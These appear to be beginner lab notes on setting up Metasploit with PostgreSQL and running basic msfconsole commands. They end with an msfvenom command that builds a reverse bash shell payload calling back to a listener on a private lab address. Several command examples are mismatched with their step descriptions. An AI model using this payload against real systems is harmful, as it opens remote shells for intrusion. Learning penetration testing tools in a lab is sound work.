**Part 1: Setup Metasploit Locally with PostgreSQL**

Set up Metasploit with PostgreSQL to manage data efficiently.

1.  **Install PostgreSQL**: Install PostgreSQL and its dependencies on your Ubuntu system.
    
2.  **Start PostgreSQL Service**: Start the PostgreSQL service to ensure the database is operational.
    
3.  **Create PostgreSQL User**: Create a dedicated PostgreSQL user specifically for Metasploit.
    
4.  **Create PostgreSQL Database**: Set up a PostgreSQL database that Metasploit will use to store its data.
    
5.  **Initialize Metasploit Database**: Initialize the Metasploit database to prepare it for use.
    
6.  **Verify Database Connection**: Start the Metasploit console and verify the connection to the PostgreSQL database.  

systemctl start postgresql
msfdb init
msf > db_status
[*] postgresql connected to msf


Part 2: Basic Usage of Metasploit

Familiarize yourself with basic commands in Metasploit for exploiting vulnerabilities.

Start the Metasploit Console: Access the Metasploit console to begin interacting with its features.

>msfconsole

Search for Exploits: Learn how to search for available exploits within Metasploitâ€™s extensive database.

Select an Exploit: Choose a specific exploit from the search results to prepare for exploitation.

msf> search portscan

Set Exploit Options: Configure the necessary options for the selected exploit before execution.

msf> set 

Set Payload: Define the payload that will be delivered to the target system during exploitation.

msf> use

Set Local Host and Port: Specify the local host and port where Metasploit will listen for incoming connections.

msf>set LHOST

Run the Exploit: Execute the configured exploit to attempt exploitation on the target system.

msf>exploit


Payload Specifications: Specify parameters such as payload type, local host, local port, output format, and output file name. payload.elf

Execute the Payload: Validate the generated payload and understand how it can be executed on Ubuntu systems.

msfvenom -p cmd/unix/reverse_bash LHOST=192.168.142.128 LPORT=443 -f raw -o payload.elf

this will create a reverse shell exploit when the file is executed on the vulnerable machine 

note file would be better as a .sh since is going to be executed in a linux enviroment
